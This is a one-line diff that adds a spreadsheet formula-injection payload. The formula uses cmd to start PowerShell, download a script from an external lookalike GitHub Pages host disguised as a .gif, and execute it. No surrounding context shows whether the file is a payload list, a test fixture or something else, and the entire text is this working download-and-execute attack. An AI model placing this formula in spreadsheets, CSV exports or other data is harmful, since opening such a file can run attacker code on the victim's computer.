@@ -1,0 +1,1 @@
+=cmd|' /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -NoLogo -c IEX ((new-object net.webclient).downloadstring(\"https://vkontakre.github.io/iqy/load.gif\"))'!A0
